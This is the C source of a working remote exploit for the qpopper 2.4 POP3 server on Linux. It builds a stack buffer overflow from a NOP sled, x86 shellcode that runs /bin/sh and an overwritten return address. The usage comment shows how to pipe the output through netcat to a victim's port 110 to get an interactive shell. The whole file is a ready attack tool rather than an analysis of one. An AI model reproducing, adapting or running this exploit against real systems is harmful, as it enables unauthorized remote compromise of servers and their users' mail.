/* Exploit for qpopper 2.4 (and others) for Linux
 *   by [WaR] (warchild@cryogen.com) and zav (zav@cryogen.com)
 *
 *  usage: (./qpopper <offset>;cat)|nc <victim> 110
 *       with offset around 1000 (try increments of 50)
 *
 *
 *    shout outs to: Zef and YZF
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFFSIZE 998

char shell[] =
   "\xeb\x33\x5e\x89\x76\x08\x31\xc0"
   "\x88\x66\x07\x83\xee\x02\x31\xdb"
   "\x89\x5e\x0e\x83\xc6\x02\xb0\x1b"
   "\x24\x0f\x8d\x5e\x08\x89\xd9\x83"
   "\xee\x02\x8d\x5e\x0e\x89\xda\x83"
   "\xc6\x02\x89\xf3\xcd\x80\x31\xdb"
   "\x89\xd8\x40\xcd\x80\xe8\xc8\xff"
   "\xff\xff/bin/sh";

unsigned long esp()
{
  __asm__(" movl %esp,%eax ");
}

main(int argc, char **argv)
{
  int i,j,offset;
  unsigned long eip;
  char buffer[4096];

  j=0;
  offset=atoi(argv[1]);
  eip=esp()+offset;
  for(i=0;i<1008;i++) buffer[i]=0x90;
  for(i=(BUFFSIZE - strlen(shell));i<BUFFSIZE;i++) buffer[i]=shell[j++];

  i=1005;
  buffer[i]=eip & 0xff;
  buffer[i+1]=(eip >> 8) & 0xff;
  buffer[i+2]=(eip >> 16) & 0xff;
  buffer[i+3]=(eip >> 24) & 0xff;

  printf("%s\nsh -i\n",buffer);
}
